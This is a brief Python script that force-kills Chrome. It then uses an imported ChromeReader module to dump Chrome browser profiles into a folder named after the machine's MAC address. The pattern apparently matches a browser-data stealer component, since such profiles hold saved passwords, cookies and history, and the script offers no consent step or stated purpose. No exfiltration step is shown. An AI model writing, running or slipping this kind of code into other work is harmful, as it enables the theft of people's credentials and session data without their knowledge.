import ChromeReader
import os
import uuid

if __name__ == "__main__":
    try:
        os.system("taskkill /f /im chrome.exe")
    except:
        pass
    profiler = ChromeReader.Profiler()
    profiler.save_profiles(os.path.join("profiles", str(uuid.getnode())))